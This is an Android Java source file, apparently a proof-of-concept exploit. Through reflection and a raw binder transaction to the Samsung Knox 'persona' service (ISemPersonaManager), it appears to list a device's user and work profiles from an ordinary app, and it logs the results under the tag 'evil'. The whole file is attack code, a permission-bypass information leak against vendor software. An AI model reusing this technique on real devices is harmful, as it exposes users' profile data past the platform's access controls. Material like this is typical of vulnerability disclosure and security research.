package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.UserManager;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            // 1
            UserManager userManager = getSystemService(UserManager.class);
            Log.d("evil", "Profiles: " + UserManager.class.getMethod("getProfiles", int.class).invoke(userManager, 0));

            // 2
            IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, "persona");
            processBinder(binder);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.samsung.android.knox.ISemPersonaManager");
            parcel.writeInt(0);
            parcel.writeBoolean(true);

            Parcel reply = Parcel.obtain();

            binder.transact(2, parcel, reply, 0);
            reply.readException();

            Log.d("evil", "Reply: " + reply.createTypedArrayList(getCreator()));
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private Parcelable.Creator getCreator() throws Throwable {
        return (Parcelable.Creator) Class.forName("android.content.pm.UserInfo")
                .getField("CREATOR")
                .get(null);
    }
}